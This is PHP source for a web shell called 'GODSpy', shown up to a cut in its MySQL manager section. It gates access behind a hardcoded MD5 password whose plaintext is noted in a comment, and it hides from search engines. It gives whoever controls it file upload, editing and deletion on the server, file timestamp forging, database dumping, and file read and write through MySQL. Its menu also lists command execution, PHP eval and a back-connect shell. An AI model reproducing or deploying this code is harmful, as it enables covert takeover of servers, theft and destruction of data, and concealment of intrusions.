<?php
error_reporting(0);
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('memory_limit','128M');
@ini_set('upload_max_filesize','40M');
define('F_ROOT',str_replace('\\','/',(($cwd = getcwd()) ? $cwd : ($_SERVER['SCRIPT_FILENAME'] ? dirname($_SERVER['SCRIPT_FILENAME']) : '.'))).'/');
define('S_ROOT',str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']));
define('IS_WIN',DIRECTORY_SEPARATOR=='\\');
define('IS_COM',class_exists('COM') ? 1 : 0 );
define('IS_GPC',get_magic_quotes_gpc());
define('IS_PHPINFO', isfunc("phpinfo"));
ob_start();
$timestamp=time();
$mtime = explode(' ',microtime());
$starttime = $mtime[1] + $mtime[0];
$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
if(!empty($_SERVER['QUERY_STRING'])){$self.='?'.$_SERVER['QUERY_STRING'];}
foreach(array('_GET','_POST') as $_request) {
	foreach($$_request as $_key => $_value) {
	if($_key{0} != '_') {
		if(IS_GPC) {$_value=s_array($_value);}
		$$_key = $_value;
	}
	}
}
$admin=array('check' => 1, 'pass' => '5db89e7472f81a4ea6b7a73f7c6729f1','cookiepre' => '','cookiedomain' => '','cookiepath' => '/','cookielife' => 86400);
// Encrypted:  	 5db89e7472f81a4ea6b7a73f7c6729f1
// Decrypted:	MD5 : swagger

if($charset == 'utf8') {
header("content-Type: text/html; charset=utf-8");
} elseif($charset == 'latin1') {
header("content-Type: text/html; charset=iso-8859-1");
}
if($haz == "logout") {
	scookie('godssid', '', -86400 * 365);
	p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
	p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');
	exit;
}
if($admin['check']) {
$password = md5($password);
	if($doing == 'login') {
		if($admin['pass'] == $password) {
			scookie('godssid', $password);
			p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
			p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');
			exit;
		}
	}
	if($_COOKIE['godssid']) {
		if($_COOKIE['godssid'] != $admin['pass']) loginpage();
	} else loginpage();
}
$errmsg='';
if($haz=='phpinfo') {
	if(IS_PHPINFO) {phpinfo();die('<h1 style="text-align:center"><a href="'.$self.'">Back to GodSpy</a></h1>');}else{$errmsg='phpinfo() function disabled';}
}
if($doing == 'downfile' && $thefile) {
	if(!@file_exists($thefile)) {
		$errmsg = 'The file you want to Download not exist';
	} else {
		$fileinfo = pathinfo($thefile);
		header('Content-type: application/x-'.$fileinfo['extension']);
		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
		header('Content-Length: '.filesize($thefile));
		@readfile($thefile);
		exit;
	}
}
if($doing=='backupmysql' && !$saveasfile) {
	$lnk=dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
	$table = array_flip($table);
	$result = q("SHOW tables");
	if(!$result) p('<h2>'.mysql_error().'</h2>');
	$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if(isset($table[$currow[0]])) {
			$mysqldata .= sqldumptable($currow[0]);
		}
	}
	mysql_close($lnk);
	exit;
}
if($doing=='mysqldown'){
	if(!$dbname) {
		$errmsg = 'Please input dbname';
	} else {
		dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		if(!file_exists($mysqldlfile)) {
			$errmsg = 'The file you want Downloadable was nonexistent';
		} else {
			$result = q("select load_file('$mysqldlfile');");
			if(!$result){
				q("DROP TABLE IF EXISTS tmp_god;");
				q("CREATE TABLE tmp_god (content LONGBLOB NOT NULL);");
				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_god FIELDS TERMINATED BY '__god_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__god_{$timestamp}_eof__';");
				$result = q("select content from tmp_god");
				q("DROP TABLE tmp_god");
			}
			$row = @mysql_fetch_array($result);
			if(!$row) {
				$errmsg = 'Load file failed '.mysql_error();
			} else {
				$fileinfo = pathinfo($mysqldlfile);
				header('Content-type: application/x-'.$fileinfo['extension']);
				header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
				header("Accept-Length: ".strlen($row[0]));
				echo $row[0];
				exit;
			}
		}
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="robots" content="noindex, nofollow, noarchive" />
<title><?php echo $_SERVER['HTTP_HOST'];?> | GODSpy</title>
<style type="text/css">
body{margin:0;table-layout:fixed;word-break:break-all;}
body,td,.input,.bt{font:12px Arial,Tahoma;}
body,td{line-height:16px;}
.input{line-height:22px;}
.input,.area{background:#fff;border:1px solid #666;padding:2px;}
.area{font:12px Consolas, 'Courier New', Monospace;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#fff;height:22px;}
a {color:#00f;text-decoration:underline;}
a:hover{color:#f00;text-decoration:none;}
.w{color:green;font-weight:bold;}
.r{color:red;}
.alt1 td, .alt2 td, .focus td, .head td {border-top:1px solid #fff;border-bottom:1px solid #ddd;padding:5px 10px 5px 5px;}
.alt1 td{background:#f1f1f1;}
.alt2 td{background:#f9f9f9;}
.focus td{background:#ffa;}
.head td{background:#e9e9e9;font-weight:bold;}
.head td span{font-weight:normal;}
form, h2{margin:0;padding:0;}
h2{height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration:none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.e,.m {padding:10px;text-align:center;font-weight:bold;}
.e {background:#FFC;border:1px solid #F30;}
.m {background:#CF9;border:1px solid #0C3;}
.nw{white-space:nowrap;}
</style>
<script type="text/javascript"><!--
function CheckAll(form) {
for(var i=0;i<form.elements.length;i++) {
	var e = form.elements[i];
	if(e.name != 'chkall')
	e.checked = form.chkall.checked;
	}
}
function $(id){return document.getElementById(id);}
function gohaz(act){
$('gohaz').haz.value=act;
$('gohaz').submit();
}
//--></script>
</head>
<body>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
	<td><span style="float:right;"><b>GODSpy Ver: <?php echo date('Y');?></b></span>Your IP: <?php echo $_SERVER['REMOTE_ADDR'] . ' | Server Data: ' .$_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>

</tr>
<tr class="alt1">
	<td><span style="float:right;">Safe Mode: <?php echo getcfg('safe_mode');?></span>
	<a href="javascript:gohaz('logout');">Logout</a> | <a href="javascript:gohaz('file');">File Manager</a> | 
	<a href="javascript:gohaz('sqladmin');">MySQL Manager</a> |	<a href="javascript:gohaz('sqlf');">MySQL Upload &amp; Download</a> | 
	<a href="javascript:gohaz('sh');">Execute Command</a> | <a href="javascript:gohaz('env');">PHP Variable</a> | 
	<a href="javascript:gohaz('evl');">Eval PHP Code</a><?php if(!IS_WIN) {?> | <a href="javascript:gohaz('bconx');">Back Connect</a><?php }?>

	</td>
</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php
formhead(array('name'=>'gohaz'));
makehide('haz');
p('</form>');
$errmsg && m($errmsg,'e');
!$dir && $dir = '.';
$nowpath = getPath(F_ROOT, $dir);
if(substr($dir, -1) != '/') {
	$dir = $dir.'/';
}
$uedir = ue($dir);
if(!$haz || $haz == 'file') {
	$dir_writeable = @is_writable($nowpath) ? '<span class="w">Writable</span>' : '<span class="r">Non-writable</span>';
	if($doing == 'deldir' && $thefile) {
		if(!file_exists($thefile)) m("$thefile directory does not exist",'e');
		elseif(deltree($thefile)) m('Directory '.basename($thefile).' delete success');
		else m('Directory '.basename($thefile).' delete failed','e');
	}elseif($doing == 'delf' && $thefile) {
		if(!file_exists($thefile)) m("$thefile does not exist",'e');
		elseif(@unlink($thefile)) m("The File <em>$thefile</em> has been deleted");
		else m("File <em>$thefile</em> delete failed",'e');
	}
	elseif($newdirname) {
		$mkdirs = $nowpath.$newdirname;
		if(file_exists($mkdirs)) m("Directory $newdirname has already exists",'e');
		elseif(@mkdir($mkdirs,0777)) {@chmod($mkdirs,0777);m("Directory $newdirname created success");}
		else m("Directory $newdirname creation failed",'e');
	}
	elseif($doupfile) {
		if(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name'])) m('File upload success');
		else m('File upload failed','e');
	}
	elseif($editfilename && $filecontent) {
		if(sv_file($editfilename, $filecontent)) m("Save file success");
		else m('Save file failed','e');		
	}
	elseif($pfile && $newperm) {
		if(!file_exists($pfile)) m('The original file does not exist','e');
		else {
			$newperm = base_convert($newperm,8,10);
			if(@chmod($pfile,$newperm)) m('Modify file attributes success');
			else m('Modify file attributes failed','e');
		}
	}
	elseif($oldname && $newfilename) {
		$nname = $nowpath.$newfilename;
		if(file_exists($nname) || !file_exists($oldname)) m($nname.' has already existed or original file does not exist','e');
		else m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : '<i class="r">failed</i>'));
	}
	elseif($sname && $tofile) {
		if(file_exists($tofile) || !file_exists($sname)) m('The goal file has already existed or original file does not exist','e');
		elseif(@copy($sname,$tofile)) m(basename($tofile).' copied '.basename($tofile).' success');
		else m(basename($tofile).' copied failed','e');
	}
	elseif($curfile && $tarfile) {
		$time = @filemtime($tarfile);
		if(!@file_exists($curfile) || !@file_exists($tarfile)) m('The goal file has already existed or original file does not exist','e');
		elseif(@touch($curfile,$time,$time)) m('Modify file the last modified success');
		else m('Modify file the last modified failed','e');
	}
	elseif($curfile && $year && $month && $day && $hour && $minute && $second) {
		$time = strtotime("$year-$month-$day $hour:$minute:$second");
		if(!@file_exists($curfile)) m(basename($curfile).' does not exist','e');
		elseif(@touch($curfile,$time,$time)) m('Modify file the last modified success');
		else m('Modify file the last modified failed');
	}
	elseif($doing == 'downrar') {
		if($dl) {
			$dfiles='';
			foreach ($dl as $filepath => $value) {
				$dfiles.=$filepath.',';
			}
			$dfiles=substr($dfiles,0,strlen($dfiles)-1);
			$dl=explode(',',$dfiles);
			$zip=new PHPZip($dl);
			$code=$zip->out;
			header('Content-type: application/octet-stream');
			header('Accept-Ranges: bytes');
			header('Accept-Length: '.strlen($code));
			header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');
			echo $code;
			exit;
		} else {
			m('Please select file(s)','e');
		}
	}
	elseif($doing=='delfiles') {
		if($dl) {
			$dfiles='';
			$succ = $fail = 0;
			foreach ($dl as $filepath => $value) {
				if(@unlink($filepath)) {
					$succ++;
				} else {
					$fail++;
				}
			}
			m('Deleting '.count($dl).' files: <span class="w">success '.$succ.'</span> - <span class="r">fail '.$fail.'</span>','e');
		} else {
			m('Please select a file(s)','e');
		}
	}
	formhead(array('name'=>'createdir'));
	makehide('newdirname');
	makehide('dir',$nowpath);
	p('</form>');
	formhead(array('name'=>'fileperm'));
	makehide('newperm');
	makehide('pfile');
	makehide('dir',$nowpath);
	p('</form>');
	formhead(array('name'=>'copyfile'));
	makehide('sname');
	makehide('tofile');
	makehide('dir',$nowpath);
	p('</form>');
	formhead(array('name'=>'rename'));
	makehide('oldname');
	makehide('newfilename');
	makehide('dir',$nowpath);
	p('</form>');
	formhead(array('name'=>'fileopform'));
	makehide('haz');
	makehide('opfile');
	makehide('dir');
	p('</form>');
	$free = @disk_free_space($nowpath);
	!$free && $free = 0;
	$all = @disk_total_space($nowpath);
	!$all && $all = 0;
	$used = $all-$free;
	$used_percent = @round(100/($all/$free),2);
	p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');
?>

<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  <form action="" method="post" id="godir" name="godir">
  <tr>
    <td class="nw">Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
	<td width="100%"><input name="view_writable" value="0" type="hidden" />
	<input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:100%;margin:0 8px;" /></td>
    <td class="nw"><input class="bt" value="GO" type="submit" /></td>
  </tr>

  </form>
</table>
<script type="text/javascript">
okdir = 'Are you sure to delete this directory?\n\nIf non-empty directory, will be delete all the files.';
okfil = 'Are you sure to delete this file?';
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if(!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
	if(!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
	if(!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
	if(!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m) {
	if(m && !confirm(m)) {return;}
	$('filelist').doing.value=doing;
	if(thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('Please input the file name:', '');
	if(!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(haz,opfile,dir){
	$('fileopform').haz.value=haz;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if(view_writable) {
		$('godir').view_writable.value=1;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
</script>
<?php
	tbhead();
	p('<form action="'.$self.'" method="post" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">');
	p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$dir.'" type="hidden" /><input name="dir" value="'.$dir.'" type="hidden" /></div>');
	p('<a href="javascript:godir(\''.S_ROOT.'\');">WebRoot</a>');
	if($view_writable) {
		p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
	} else {
		p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">View Writable</a>');
	}
	p(' | <a href="javascript:createdir();">Make Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Make File</a>');
	if(IS_WIN && IS_COM) {
		$obj = new COM('scripting.filesystemobject');
		if($obj && is_object($obj)) {
			$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
			foreach($obj->Drives as $drive) {
				if($drive->DriveType == 2) {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount($drive->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				} else {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				}
			}
		}
	}
	p('</td></tr></form>');
	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / User</td><td width="22%">Action</td></tr>');
	$dirdata=array();
	$filedata=array();
	if($view_writable) {
		$dirdata = GetList($nowpath);
	} else {
		$dirs=@opendir($dir);
		while ($file=@readdir($dirs)) {
			$filepath=$nowpath.$file;
			if(@is_dir($filepath)){
				$dirdb['filename']=$file;
				$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$dirdb['dirchmod']=getChmod($filepath);
				$dirdb['dirperm']=getPerms($filepath);
				$dirdb['fileowner']=getUser($filepath);
				$dirdb['dirlink']=$nowpath;
				$dirdb['server_link']=$filepath;
				$dirdb['client_link']=ue($filepath);
				$dirdata[]=$dirdb;
			} else {		
				$filedb['filename']=$file;
				$filedb['size']=sizecount(@filesize($filepath));
				$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$filedb['filechmod']=getChmod($filepath);
				$filedb['fileperm']=getPerms($filepath);
				$filedb['fileowner']=getUser($filepath);
				$filedb['dirlink']=$nowpath;
				$filedb['server_link']=$filepath;
				$filedb['client_link']=ue($filepath);
				$filedata[]=$filedb;
			}
		}
		unset($dirdb);
		unset($filedb);
		@closedir($dirs);
	}
	@sort($dirdata);
	@sort($filedata);
	$dir_i = '0';
	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			$tbg = bg();
			p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
			p('<td width="2%" class="nw">&nbsp;</td>');
			p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
			p('<td class="nw">'.$dirdb['mtime'].'</td>');
			p('<td class="nw">--</td>');
			p('<td class="nw">');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].' / '.$dirdb['dirperm'].'</a>');
			p($dirdb['fileowner'].'</td>');
			p('<td class="nw"><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',okdir)">Del</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
				p('<tr class="'.bg().'">');
				p('<td align="center"><font face="Wingdings 3" size=4>UP</font></td><td class="nw" colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
				p('</tr>');
			}
		}
	}
	p('<tr><td style="background:#555;height:3px;" colspan="6">&nbsp;</td></tr>');
	p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
	makehide('haz','file');
	makehide('thefile');
	makehide('doing');
	makehide('dir',$nowpath);
	$file_i = '0';
	foreach($filedata as $key => $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			$fileurl = str_replace(S_ROOT,'',$filedb['server_link']);
			$thisbg = bg();
			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
			p('<td width="2%" class="nw"><input type="checkbox" value="1" name="dl['.$filedb['server_link'].']" /></td>');
			p('<td><a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a></td>');
			p('<td class="nw">'.$filedb['mtime'].'</td>');
			p('<td class="nw">'.$filedb['size'].'</td>');
			p('<td class="nw">');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].' / '.$filedb['fileperm'].'</a>');
			p($filedb['fileowner'].'</td>');
			p('<td class="nw">');
			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
			p('<a href="javascript:dofile(\'delf\',\''.$filedb['server_link'].'\', okfil)" title="Delete">Del</a> | <a href="javascript:rename(\''.$filedb['server_link'].'\');" title="Rename">Ren</a> | ');
			p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Time</a>');
			p('</td></tr>');
			$file_i++;
		}
	}
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Packing download selected</a> - <a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td colspan="4" align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
	p('</form></table>');
}
elseif($haz == 'sqlf') {
	if($doing=="mysqlupload"){
		$file = $_FILES['uploadfile'];
		$filename = $file['tmp_name'];
		if(file_exists($savepath)) {
			m('The goal file has already existed');
		} else {
			if(!$filename) {
				m('Please choose a file');
			} else {
				$fp=@fopen($filename,'r');
				$contents=@fread($fp, filesize($filename));
				@fclose($fp);
				$contents = bin2hex($contents);
				if(!$upname) $upname = $file['name'];
				dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
				$result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
				m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
			}
		}
	}
?>

<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
</script>
<?php
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$charsets = array(''=>'Default','utf8'=>'UTF-8', 'latin1'=>'Latin1');
	formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
	makehide('haz','sqlf');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBName:');
	makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
	p("</p>\n</form>");
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" id="mysqlfile">');
	p('<h2>Upload file</h2>');
	p('<p><b>This operation the DB user must has FILE privilege</b></p>');
	p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
	p('<h2>Download file</h2>');
	p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
	makehide('dbhost');
	makehide('dbport');
	makehide('dbuser');
	makehide('dbpass');
	makehide('dbname');
	makehide('charset');
	makehide('doing');
	makehide('haz','sqlf');
	p('</form>');
}
elseif($haz=='sqladmin') {
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
	if(isset($dbhost)){
		$dbform .= '<input type="hidden" id="dbhost" name="dbhost" value="'.$dbhost.'" />'."\n";
	}
	if(isset($dbuser)) {
		$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
	}
	if(isset($dbpass)) {
		$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
	}
	if(isset($dbport)) {
		$dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
	}
	if(isset($dbname)) {
		$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
	}
	if(isset($charset)) {
		$dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
	}
	if($doing == 'backupmysql' && $saveasfile) {
		if(!$table) {
			m('Please choose the table','e');
		} else {
			$lnk=dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			$table = array_flip($table);
			$fp = @fopen($path,'w');
			if($fp) {
				$result = q('SHOW tables');
				if(!$result) p('<h2>'.mysql_error().'</h2>');
				$mysqldata = '';
				while($currow = mysql_fetch_array($result)) {
					if(isset($table[$currow[0]])) {
						sqldumptable($currow[0], $fp);
					}
				}
				fclose($fp);
				$fileurl = str_replace(F_ROOT,'',$path);
				m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
				mysql_close($lnk);
			} else {
				m('Backup failed','e');
			}
		}
	}
	if($insert && $insertsql) {
		$keystr = $valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			if($val) {
				$keystr .= $tmp.$key;
				$valstr .= $tmp."'".addslashes($val)."'";
				$tmp = ',';
			}
		}
		if($keystr && $valstr) {
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
		}
	}
	if($update && $insertsql && $base64) {
		$valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			$valstr .= $tmp.$key."='".addslashes($val)."'";
			$tmp = ',';
		}
		if($valstr) {
			$where = base64_decode($base64);
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
		}
	}
	if($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		$delete_sql = "DELETE FROM $tablename WHERE $where";
		dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
	}
	if($tablename && $doing == 'drop') {
		dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		if(q("DROP TABLE $tablename")) {
			m('Drop table of success');
			$tablename = '';
		} else {
			m(mysql_error());
		}
	}
	$charsets = array(''=>'Default','utf8'=>'UTF-8', 'latin1'=>'Latin1');
	formhead(array('title'=>'MYSQL Manager'));
	makehide('haz','sqladmin');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
	makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
	p("</p>\n</form>");
?>

<script type="text/javascript">
function editrecord(haz, base64, tablename){
	if(haz == 'del') {		
		if(!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=haz;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if(doing) {
		$('settable').doing.value=doing;
	}
	if(page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
</script>
<?php 
formhead(array('name'=>'recordlist'));
makehide('doing');
makehide('haz','sqladmin');
makehide('base64');
makehide('tablename');
p($dbform);
p('</form>');
formhead(array('name'=>'setdbname'));
makehide('haz','sqladmin');
p($dbform);
if(!$dbname) {
	makehide('dbname');
}
p('</form>');
formhead(array('name'=>'settable'));
makehide('haz','sqladmin');
p($dbform);
makehide('tablename');
makehide('page',$page);
makehide('doing');
p('</form>');
$cachetables = array();	
$pagenum = 30;
$page = intval($page);
if($page) {
	$start_limit = ($page - 1) * $pagenum;
	} else {
	$start_limit = 0;
	$page = 1;
}
if(isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
	$lnk=dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
	$mysqlver = mysql_get_server_info();
	p('<form id="setdbname" method="post" action="'.$self.'">
	<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
	$highver = $mysqlver > '4.1' ? 1 : 0;
	$query = q("SHOW DATABASES");
	$dbs = array();
	$dbs[] = '-- Select a database --';
	while($db = mysql_fetch_array($query)) {
		$dbs[$db['Database']] = $db['Database'];
	}
	makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
	p('</form>');
	$tabledb = array();
	if($dbname) {
		p('<p>');
		p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
		if($tablename) {
			p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');}
			p('</p>');
			mysql_select_db($dbname);
			$getnumsql = '';
			$runquery = 0;
			if($sql_query) {
				$runquery = 1;
			}
			$allowedit = 0;
			if($tablename && !$sql_query) {
				$sql_query = "SELECT * FROM $tablename";
				$getnumsql = $sql_query;
				$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
				$allowedit = 1;
			}
